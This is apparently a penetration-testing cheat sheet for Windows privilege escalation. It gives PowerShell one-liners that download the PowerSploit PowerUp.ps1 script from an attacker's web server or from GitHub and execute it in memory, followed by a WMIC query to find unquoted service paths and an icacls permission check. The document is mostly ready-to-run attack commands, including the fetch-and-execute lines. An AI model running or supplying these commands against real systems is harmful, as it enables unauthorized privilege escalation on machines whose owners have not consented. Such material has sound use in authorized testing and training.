# Privilege Escalation

## PowerUp.ps1

Link https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

Download and run from attacker's machine

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/PowerUp.ps1');Invoke-AllChecks
```

Download and run from internet

```
powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks
```


## Hunt for unquoted service paths

The following query will use WMIC to look for services set to auto start in the `C:\Windows` directory without properly quoting spaces in the path:

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
You can then use the `icacls <directory>` to check for `FULL (F)` or `write (W)` permissions on the vulnerable directory *based on the group of your current user*: 

```
> icacls c:\PS 

c:\PS CORP\someusername:(OI)(CI)(M)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```


